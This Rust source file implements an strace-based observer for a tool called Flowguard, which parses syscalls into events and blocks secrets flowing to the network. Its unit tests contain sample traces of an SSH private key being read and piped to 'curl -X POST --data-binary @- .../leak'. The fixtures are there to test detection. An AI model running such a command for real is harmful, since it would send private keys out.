use std::collections::{BTreeMap, BTreeSet};
use std::path::PathBuf;
use std::process::Command;

use crate::events::{Endpoint, Event, Fd, PipeId, ProcessId, StartTime, Timestamp};
use crate::scenarios::Scenario;

use super::{EventSource, EventSourceError};

/// Linux `strace`-backed observer source.
///
/// This is intentionally an MVP observability adapter, not a blocking backend.
/// It runs a command under `strace -f`, parses a narrow syscall subset, and
/// materializes normalized Flowguard events for the existing provenance engine.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct StraceSource {
    command: Vec<String>,
    raw_trace_path: Option<PathBuf>,
}

impl StraceSource {
    pub fn new(command: Vec<String>) -> Self {
        Self {
            command,
            raw_trace_path: None,
        }
    }

    pub fn with_raw_trace_path(mut self, path: impl Into<PathBuf>) -> Self {
        self.raw_trace_path = Some(path.into());
        self
    }
}

impl EventSource for StraceSource {
    fn load_scenario(&self) -> Result<Scenario, EventSourceError> {
        let trace_path = std::env::temp_dir().join(format!(
            "flowguard-strace-{}-{}.log",
            std::process::id(),
            unique_trace_suffix()
        ));
        // `-o` keeps trace records separate from the observed program's stderr,
        // which prevents curl progress output from corrupting syscall lines.
        let output = Command::new("strace")
            .arg("-f")
            .arg("-qq")
            .arg("-v")
            .arg("-s")
            .arg("256")
            .arg("-o")
            .arg(&trace_path)
            .arg("-e")
            .arg(
                "trace=execve,clone,clone3,fork,vfork,open,openat,pipe,pipe2,dup,dup2,dup3,close,read,write,connect,sendto,sendmsg,recvfrom,recvmsg",
            )
            .arg("--")
            .args(&self.command)
            .output()
            .map_err(|source| EventSourceError::CommandIo {
                program: "strace".to_string(),
                source,
            })?;

        drop(output);

        let trace =
            std::fs::read_to_string(&trace_path).map_err(|source| EventSourceError::Io {
                path: trace_path.clone(),
                source,
            })?;
        if let Some(raw_trace_path) = &self.raw_trace_path {
            std::fs::write(raw_trace_path, &trace).map_err(|source| {
                EventSourceError::RawTraceIo {
                    path: raw_trace_path.clone(),
                    source,
                }
            })?;
        }
        let _ = std::fs::remove_file(&trace_path);

        Ok(parse_strace_output(&trace, &self.command))
    }
}

fn unique_trace_suffix() -> u128 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|duration| duration.as_nanos())
        .unwrap_or_default()
}

pub fn parse_strace_output(input: &str, command_hint: &[String]) -> Scenario {
    StraceParser::new(command_hint).parse(input)
}

struct StraceParser {
    events: Vec<Event>,
    processes: BTreeMap<u32, ProcessId>,
    connected_fds: BTreeSet<(u32, Fd)>,
    unfinished: BTreeMap<(u32, String), String>,
    command_hint: Vec<String>,
    next_start_time: u64,
    next_pipe_id: u64,
}

impl StraceParser {
    fn new(command_hint: &[String]) -> Self {
        Self {
            events: Vec::new(),
            processes: BTreeMap::new(),
            connected_fds: BTreeSet::new(),
            unfinished: BTreeMap::new(),
            command_hint: command_hint.to_vec(),
            next_start_time: 10_000,
            next_pipe_id: 1_000,
        }
    }

    fn parse(mut self, input: &str) -> Scenario {
        for line in input.lines() {
            self.parse_line(line);
        }

        Scenario::new("observe_strace", self.events)
    }

    fn parse_line(&mut self, line: &str) {
        // With `-f`, strace can split concurrent syscalls into an unfinished
        // prefix and a later resumed suffix. Recombine before normalization so
        // FD mappings still come from the original observed syscall.
        if let Some((pid, syscall, prefix)) = parse_unfinished_line(line) {
            self.unfinished.insert((pid, syscall), prefix);
            return;
        }

        if let Some(completed) = self.resume_unfinished_line(line) {
            self.parse_completed_line(&completed);
            return;
        };

        self.parse_completed_line(line);
    }

    fn resume_unfinished_line(&mut self, line: &str) -> Option<String> {
        let (pid, rest) = parse_pid_prefix(line);
        let rest = rest.trim_start();
        let rest = rest.strip_prefix("<... ")?;
        let (syscall, tail) = rest.split_once(" resumed>")?;
        let prefix = self.unfinished.remove(&(pid, syscall.trim().to_string()))?;
        Some(format!("{pid} {}{}", prefix.trim_end(), tail.trim_start()))
    }

    fn parse_completed_line(&mut self, line: &str) {
        let Some(parsed) = ParsedLine::parse(line) else {
            return;
        };

        match parsed.syscall.as_str() {
            "execve" => self.parse_execve(parsed.pid, &parsed.args, parsed.return_value),
            "clone" | "clone3" | "fork" | "vfork" => {
                self.parse_fork(parsed.pid, parsed.return_value)
            }
            "open" | "openat" => self.parse_open(parsed.pid, &parsed.args, parsed.return_value),
            "pipe" | "pipe2" => self.parse_pipe(parsed.pid, &parsed.args, parsed.return_value),
            "dup" | "dup2" | "dup3" => self.parse_dup(
                parsed.pid,
                &parsed.syscall,
                &parsed.args,
                parsed.return_value,
            ),
            "close" => self.parse_close(parsed.pid, &parsed.args, parsed.return_value),
            "read" => self.parse_read(parsed.pid, &parsed.args, parsed.return_value),
            "write" => self.parse_write(parsed.pid, &parsed.args, parsed.return_value),
            "connect" => self.parse_connect(
                parsed.pid,
                &parsed.args,
                parsed.return_value,
                &parsed.return_text,
            ),
            "sendto" | "sendmsg" => self.parse_send(parsed.pid, &parsed.args, parsed.return_value),
            "recvfrom" | "recvmsg" => {
                self.parse_recv(parsed.pid, &parsed.args, parsed.return_value)
            }
            _ => {}
        }
    }

    fn parse_execve(&mut self, pid: u32, args: &str, return_value: i64) {
        if return_value != 0 {
            return;
        }

        let program = first_quoted(args).unwrap_or_else(|| "unknown".to_string());
        let argv = parse_exec_argv(args).unwrap_or_else(|| vec![program.clone()]);

        if !self.processes.contains_key(&pid) {
            self.ensure_process(pid, Some(argv));
            return;
        }

        let parent = self.ensure_process(pid, None);
        let child = self.next_process_identity(pid);
        self.processes.insert(pid, child.clone());
        self.events.push(Event::Exec {
            parent,
            child,
            program: PathBuf::from(program),
            argv,
            at: self.next_timestamp(),
        });
    }

    fn parse_fork(&mut self, parent_pid: u32, return_value: i64) {
        if return_value <= 0 {
            return;
        }

        let child_pid = return_value as u32;
        let parent = self.ensure_process(parent_pid, None);
        let child = self.next_process_identity(child_pid);
        self.processes.insert(child_pid, child.clone());
        self.events.push(Event::Fork {
            parent,
            child,
            at: self.next_timestamp(),
        });
    }

    fn parse_open(&mut self, pid: u32, args: &str, return_value: i64) {
        if return_value < 0 {
            return;
        }

        let Some(path) = first_quoted(args) else {
            return;
        };
        let process = self.ensure_process(pid, None);
        self.events.push(Event::Open {
            process,
            fd: Fd(return_value as i32),
            path: PathBuf::from(path),
            at: self.next_timestamp(),
        });
    }

    fn parse_pipe(&mut self, pid: u32, args: &str, return_value: i64) {
        if return_value != 0 {
            return;
        }

        let Some((read_fd, write_fd)) = parse_fd_pair(args) else {
            return;
        };
        let process = self.ensure_process(pid, None);
        let pipe = PipeId(self.next_pipe_id);
        self.next_pipe_id += 1;
        self.events.push(Event::Pipe {
            process,
            pipe,
            read_fd: Fd(read_fd),
            write_fd: Fd(write_fd),
            at: self.next_timestamp(),
        });
    }

    fn parse_dup(&mut self, pid: u32, syscall: &str, args: &str, return_value: i64) {
        if return_value < 0 {
            return;
        }

        let Some(from_fd) = first_i32(args) else {
            return;
        };
        let to_fd = if syscall == "dup" {
            return_value as i32
        } else {
            let Some((_, to_fd)) = first_two_i32(args) else {
                return;
            };
            to_fd
        };

        let process = self.ensure_process(pid, None);
        self.events.push(Event::Dup {
            process,
            from_fd: Fd(from_fd),
            to_fd: Fd(to_fd),
            at: self.next_timestamp(),
        });
    }

    fn parse_close(&mut self, pid: u32, args: &str, return_value: i64) {
        if return_value != 0 {
            return;
        }

        let Some(fd) = first_i32(args) else {
            return;
        };
        let fd = Fd(fd);
        let process = self.ensure_process(pid, None);
        self.connected_fds.remove(&(pid, fd));
        self.events.push(Event::Close {
            process,
            fd,
            at: self.next_timestamp(),
        });
    }

    fn parse_read(&mut self, pid: u32, args: &str, return_value: i64) {
        if return_value <= 0 {
            return;
        }

        let Some(fd) = first_i32(args) else {
            return;
        };
        let process = self.ensure_process(pid, None);
        let fd = Fd(fd);
        if self.connected_fds.contains(&(pid, fd)) {
            self.events.push(Event::Recv {
                process,
                fd,
                len: return_value as usize,
                at: self.next_timestamp(),
            });
        } else {
            self.events.push(Event::Read {
                process,
                fd,
                len: return_value as usize,
                at: self.next_timestamp(),
            });
        }
    }

    fn parse_write(&mut self, pid: u32, args: &str, return_value: i64) {
        if return_value <= 0 {
            return;
        }

        let Some(fd) = first_i32(args) else {
            return;
        };
        let process = self.ensure_process(pid, None);
        let fd = Fd(fd);
        if self.connected_fds.contains(&(pid, fd)) {
            self.events.push(Event::Send {
                process,
                fd,
                len: return_value as usize,
                at: self.next_timestamp(),
            });
        } else {
            self.events.push(Event::Write {
                process,
                fd,
                len: return_value as usize,
                at: self.next_timestamp(),
            });
        }
    }

    fn parse_connect(&mut self, pid: u32, args: &str, return_value: i64, return_text: &str) {
        if return_value != 0 && !return_text.contains("EINPROGRESS") {
            return;
        }
        if args.contains("AF_UNSPEC") {
            return;
        }

        let Some(fd) = first_i32(args) else {
            return;
        };
        let process = self.ensure_process(pid, None);
        let fd = Fd(fd);
        self.connected_fds.insert((pid, fd));
        self.events.push(Event::Connect {
            process,
            fd,
            endpoint: parse_endpoint(args),
            at: self.next_timestamp(),
        });
    }

    fn parse_send(&mut self, pid: u32, args: &str, return_value: i64) {
        if return_value <= 0 {
            return;
        }

        let Some(fd) = first_i32(args) else {
            return;
        };
        let process = self.ensure_process(pid, None);
        self.events.push(Event::Send {
            process,
            fd: Fd(fd),
            len: return_value as usize,
            at: self.next_timestamp(),
        });
    }

    fn parse_recv(&mut self, pid: u32, args: &str, return_value: i64) {
        if return_value <= 0 {
            return;
        }

        let Some(fd) = first_i32(args) else {
            return;
        };
        let process = self.ensure_process(pid, None);
        self.events.push(Event::Recv {
            process,
            fd: Fd(fd),
            len: return_value as usize,
            at: self.next_timestamp(),
        });
    }

    fn ensure_process(&mut self, pid: u32, command: Option<Vec<String>>) -> ProcessId {
        if let Some(process) = self.processes.get(&pid) {
            return process.clone();
        }

        let process = self.next_process_identity(pid);
        self.processes.insert(pid, process.clone());
        self.events.push(Event::AgentLaunch {
            process: process.clone(),
            command: command
                .filter(|command| !command.is_empty())
                .unwrap_or_else(|| self.default_command(pid)),
            at: self.next_timestamp(),
        });
        process
    }

    fn next_process_identity(&mut self, pid: u32) -> ProcessId {
        let process = ProcessId::new(pid, StartTime(self.next_start_time));
        self.next_start_time += 10;
        process
    }

    fn default_command(&self, pid: u32) -> Vec<String> {
        if self.command_hint.is_empty() {
            vec![format!("observed-pid:{pid}")]
        } else {
            self.command_hint.clone()
        }
    }

    fn next_timestamp(&self) -> Timestamp {
        Timestamp(self.events.len() as u64 + 1)
    }
}

struct ParsedLine {
    pid: u32,
    syscall: String,
    args: String,
    return_value: i64,
    return_text: String,
}

impl ParsedLine {
    fn parse(line: &str) -> Option<Self> {
        let line = line.trim();
        if line.is_empty() || line.starts_with("+++") || line.contains("= ?") {
            return None;
        }

        let (pid, rest) = parse_pid_prefix(line);
        let open_paren = rest.find('(')?;
        let syscall = rest[..open_paren].trim();
        if !is_syscall_name(syscall) {
            return None;
        }

        let (before_return, return_text) = rest.rsplit_once('=')?;
        let before_return = before_return.trim_end();
        let close_paren = before_return.rfind(')')?;
        if !before_return[close_paren..].trim().starts_with(')') {
            return None;
        }
        let args = &before_return[open_paren + 1..close_paren];
        let return_value = return_text.split_whitespace().next()?.parse().ok()?;

        Some(Self {
            pid,
            syscall: syscall.to_string(),
            args: args.to_string(),
            return_value,
            return_text: return_text.to_string(),
        })
    }
}

fn parse_unfinished_line(line: &str) -> Option<(u32, String, String)> {
    let (pid, rest) = parse_pid_prefix(line);
    let marker = rest.find("<unfinished ...>")?;
    let prefix = rest[..marker].trim_end().to_string();
    let open_paren = prefix.find('(')?;
    let syscall = prefix[..open_paren].trim();
    if !is_syscall_name(syscall) {
        return None;
    }

    Some((pid, syscall.to_string(), prefix))
}

fn is_syscall_name(syscall: &str) -> bool {
    let mut chars = syscall.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    (first == '_' || first.is_ascii_alphabetic())
        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
}

fn parse_pid_prefix(line: &str) -> (u32, &str) {
    let line = trim_interleaved_stderr_prefix(line);
    if let Some(rest) = line.strip_prefix("[pid") {
        if let Some((pid, tail)) = rest.trim_start().split_once(']') {
            if let Ok(pid) = pid.trim().parse() {
                return (pid, tail.trim_start());
            }
        }
    }

    let digit_len = line
        .chars()
        .take_while(|ch| ch.is_ascii_digit())
        .map(char::len_utf8)
        .sum();
    if digit_len > 0 {
        let tail = line[digit_len..].trim_start();
        if tail
            .chars()
            .next()
            .is_some_and(|ch| ch.is_ascii_alphabetic() || ch == '<')
        {
            if let Ok(pid) = line[..digit_len].parse() {
                return (pid, tail);
            }
        }
    }

    (1, line)
}

fn trim_interleaved_stderr_prefix(line: &str) -> &str {
    let line = line.trim_start();
    if let Some(index) = line.find("[pid") {
        if !line[..index].contains('(') {
            return &line[index..];
        }
    }
    line
}

fn first_quoted(input: &str) -> Option<String> {
    quoted_strings(input).into_iter().next()
}

fn parse_exec_argv(args: &str) -> Option<Vec<String>> {
    let array_start = args.find('[')?;
    let array_end = args[array_start..].find(']')? + array_start;
    Some(quoted_strings(&args[array_start..=array_end]))
}

fn quoted_strings(input: &str) -> Vec<String> {
    let mut strings = Vec::new();
    let mut chars = input.chars().peekable();

    while let Some(ch) = chars.next() {
        if ch != '"' {
            continue;
        }

        let mut value = String::new();
        while let Some(ch) = chars.next() {
            match ch {
                '"' => break,
                '\\' => {
                    if let Some(escaped) = chars.next() {
                        value.push(escaped);
                    }
                }
                other => value.push(other),
            }
        }
        strings.push(value);
    }

    strings
}

fn first_i32(input: &str) -> Option<i32> {
    first_signed_ints(input).into_iter().next()
}

fn first_two_i32(input: &str) -> Option<(i32, i32)> {
    let values = first_signed_ints(input);
    Some((*values.first()?, *values.get(1)?))
}

fn first_signed_ints(input: &str) -> Vec<i32> {
    let mut values = Vec::new();
    let mut current = String::new();

    for ch in input.chars().chain(std::iter::once(',')) {
        if ch.is_ascii_digit() || (ch == '-' && current.is_empty()) {
            current.push(ch);
            continue;
        }

        if !current.is_empty() && current != "-" {
            if let Ok(value) = current.parse() {
                values.push(value);
            }
        }
        current.clear();
    }

    values
}

fn parse_fd_pair(input: &str) -> Option<(i32, i32)> {
    let start = input.find('[')?;
    let end = input[start..].find(']')? + start;
    first_two_i32(&input[start..=end])
}

fn parse_endpoint(args: &str) -> Endpoint {
    let host = between(args, "inet_addr(\"", "\")")
        .or_else(|| between(args, "inet_pton(AF_INET, \"", "\""))
        .unwrap_or_else(|| "unknown".to_string());
    let port = between(args, "sin_port=htons(", ")")
        .and_then(|port| port.parse().ok())
        .unwrap_or(0);
    Endpoint::tcp(host, port)
}

fn between(input: &str, prefix: &str, suffix: &str) -> Option<String> {
    let start = input.find(prefix)? + prefix.len();
    let end = input[start..].find(suffix)? + start;
    Some(input[start..end].to_string())
}

#[cfg(test)]
mod tests {
    use crate::events::Event;
    use crate::policy::{DecisionKind, PolicyId};
    use crate::scenarios::ScenarioRunner;

    use super::parse_strace_output;

    #[test]
    fn parses_open_read_write_lines() {
        let scenario = parse_strace_output(
            r#"
execve("/bin/cat", ["cat", "/home/user/.ssh/id_rsa"], 0x7ffc) = 0
openat(AT_FDCWD, "/home/user/.ssh/id_rsa", O_RDONLY) = 3
read(3, "secret", 4096) = 6
write(1, "secret", 6) = 6
close(3) = 0
"#,
            &["cat".into(), "/home/user/.ssh/id_rsa".into()],
        );

        assert_eq!(scenario.name, "observe_strace");
        assert_eq!(scenario.events.len(), 5);
        assert!(matches!(
            scenario.events[0].event,
            Event::AgentLaunch { .. }
        ));
        assert!(matches!(scenario.events[1].event, Event::Open { .. }));
        assert!(matches!(
            scenario.events[2].event,
            Event::Read { len: 6, .. }
        ));
        assert!(matches!(
            scenario.events[3].event,
            Event::Write { len: 6, .. }
        ));
        assert!(matches!(scenario.events[4].event, Event::Close { .. }));
    }

    #[test]
    fn parses_connected_write_as_send_and_blocks_secret_to_network() {
        let scenario = parse_strace_output(
            r#"
execve("/bin/sh", ["sh", "-c", "cat /home/user/.ssh/id_rsa"], 0x7ffc) = 0
openat(AT_FDCWD, "/home/user/.ssh/id_rsa", O_RDONLY) = 3
read(3, "secret", 4096) = 6
connect(6, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("198.51.100.10")}, 16) = 0
write(6, "secret", 6) = 6
"#,
            &[
                "sh".into(),
                "-c".into(),
                "cat /home/user/.ssh/id_rsa".into(),
            ],
        );

        let outcome = ScenarioRunner::new().run(&scenario);

        assert!(matches!(
            scenario.events[4].event,
            Event::Send { len: 6, .. }
        ));
        assert_eq!(outcome.enforcement.decision.kind, DecisionKind::Block);
        assert_eq!(
            outcome.enforcement.decision.violations[0].policy,
            PolicyId::SecretToNetwork
        );
    }

    #[test]
    fn parses_fork_and_exec_with_pid_prefix() {
        let scenario = parse_strace_output(
            r#"
execve("/bin/sh", ["sh", "-c", "true"], 0x7ffc) = 0
clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID) = 42
[pid 42] execve("/usr/bin/true", ["true"], 0x7ffc) = 0
"#,
            &["sh".into(), "-c".into(), "true".into()],
        );

        assert_eq!(scenario.events.len(), 3);
        assert!(matches!(scenario.events[1].event, Event::Fork { .. }));
        assert!(matches!(scenario.events[2].event, Event::Exec { .. }));
    }

    #[test]
    fn parses_einprogress_connect_as_endpoint_mapping() {
        let scenario = parse_strace_output(
            r#"
execve("/bin/curl", ["curl", "http://127.0.0.1:8000"], 0x7ffc) = 0
connect(3, {sa_family=AF_INET, sin_port=htons(8000), sin_addr=inet_addr("127.0.0.1")}, 16) = -1 EINPROGRESS (Operation now in progress)
write(3, "POST /leak", 10) = 10
"#,
            &["curl".into(), "http://127.0.0.1:8000".into()],
        );

        assert!(matches!(scenario.events[1].event, Event::Connect { .. }));
        assert!(matches!(
            scenario.events[2].event,
            Event::Send { len: 10, .. }
        ));
    }

    #[test]
    fn parses_split_pipeline_trace_and_blocks_secret_to_network() {
        let scenario = parse_strace_output(
            r#"
10    execve("/usr/bin/sh", ["sh", "-c", "cat /home/user/.ssh/id_rsa | curl -X POST --data-binary @- http://127.0.0.1:8000/leak"], ["ENV=1"]) = 0
10    pipe2([3, 4], 0)                  = 0
10    clone(child_stack=NULL, flags=SIGCHLD, child_tidptr=0x1) = 11
11    dup3(4, 1, 0)                     = 1
11    execve("/usr/bin/cat", ["cat", "/home/user/.ssh/id_rsa"], ["ENV=1"] <unfinished ...>
10    clone(child_stack=NULL, flags=SIGCHLD, child_tidptr=0x1) = 12
12    dup3(3, 0, 0 <unfinished ...>
11    <... execve resumed>)             = 0
12    <... dup3 resumed>)               = 0
12    execve("/usr/bin/curl", ["curl", "-X", "POST", "--data-binary", "@-", "http://127.0.0.1:8000/leak"], ["ENV=1"]) = 0
11    openat(AT_FDCWD, "/home/user/.ssh/id_rsa", O_RDONLY <unfinished ...>
11    <... openat resumed>)             = 3
11    read(3,  <unfinished ...>
11    <... read resumed>"secret", 4096) = 6
11    write(1, "secret", 6 <unfinished ...>
11    <... write resumed>)              = 6
12    read(0, "secret", 4096)           = 6
12    connect(5, {sa_family=AF_INET, sin_port=htons(8000), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
12    sendto(5, "secret", 6, MSG_NOSIGNAL, NULL, 0 <unfinished ...>
12    <... sendto resumed>)             = 6
"#,
            &["sh".into(), "-c".into(), "cat | curl".into()],
        );

        let outcome = ScenarioRunner::new().run(&scenario);

        assert!(
            scenario
                .events
                .iter()
                .any(|event| matches!(&event.event, Event::Pipe { .. }))
        );
        assert!(
            scenario
                .events
                .iter()
                .any(|event| matches!(&event.event, Event::Read { len: 6, .. }))
        );
        assert!(
            scenario
                .events
                .iter()
                .any(|event| matches!(&event.event, Event::Send { len: 6, .. }))
        );
        assert_eq!(outcome.enforcement.decision.kind, DecisionKind::Block);
        assert_eq!(
            outcome.enforcement.decision.violations[0].policy,
            PolicyId::SecretToNetwork
        );
        assert!(!outcome.explanations[0].path.is_empty());
    }
}
